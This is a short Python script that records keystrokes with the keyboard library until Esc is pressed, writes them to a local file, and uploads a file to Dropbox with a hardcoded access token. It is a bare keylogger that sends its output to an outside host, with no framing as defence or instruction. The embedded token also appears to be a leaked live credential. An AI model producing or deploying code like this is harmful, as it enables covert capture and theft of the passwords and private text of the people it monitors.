
import keyboard

with open('test2', 'r+') as file:
 events = keyboard.record(until="esc")
 for i in events:
    file.write(str(i))


import dropbox

db = dropbox.Dropbox('f-e8s_6DBjAAAAAAAAAAH0KzgU345ljs1OCvPF2VlxDfj_8aEHA6OxsrLFyho_m-')
fname = 'test2.txt'
dname = '/test2.txt'
f = open(fname, 'rb')
response = db.files_upload(f.read(), dname)
print('upload:', response)
f.close()
